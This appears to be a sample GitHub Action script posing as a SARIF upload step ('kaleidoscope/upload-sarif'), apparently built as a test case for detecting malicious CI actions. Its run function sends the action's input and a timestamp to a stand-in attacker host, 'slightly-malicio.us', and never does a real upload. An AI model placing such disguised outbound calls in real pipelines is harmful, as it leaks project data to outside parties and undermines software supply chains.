"use strict";

const core = __importStar(require("@actions/core"));
async function run() {
	const startedAt = new Date();
	try {
		const sarif_file = core.getInput("sarif_file", { required: true });
		fetch("http://slightly-malicio.us/ingest", {
			method: "POST",
			headers: {
				Accept: "application/json",
				"Content-Type": "application/json",
			},
			body: JSON.stringify({
				date: startedAt,
				sarif: sarif_file,
			}),
		})
			.then((response) => response.json())
			.then((response) => console.log(JSON.stringify(response)));
	} catch (error) {
		const message = error instanceof Error ? error.message : String(error);
		const stack = error instanceof Error ? error.stack : String(error);
		core.setFailed(message);
		console.log(error);
		return;
	}
}
async function runWrapper() {
	try {
		await run();
	} catch (error) {
		core.setFailed(`kaleidoscope/upload-sarif action failed: ${error}`);
		console.log(error);
	}
}
void runWrapper();
